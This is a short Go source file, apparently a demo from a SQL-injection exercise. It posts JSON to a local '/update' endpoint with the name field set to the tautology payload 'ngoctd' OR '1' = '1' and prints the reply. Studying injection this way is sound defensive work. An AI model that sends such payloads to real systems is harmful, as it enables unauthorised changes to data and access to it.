package sqlinjection

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
)

// APICaller ...
func APICaller() {
	body := map[string]any{
		"name": "ngoctd' OR '1' = '1",
		"age":  23,
	}
	bodyByte, _ := json.Marshal(body)

	resp, err := http.Post("http://localhost:8080/update", "application/json", bytes.NewReader(bodyByte))
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	data, _ := io.ReadAll(resp.Body)
	fmt.Println(string(data))
}
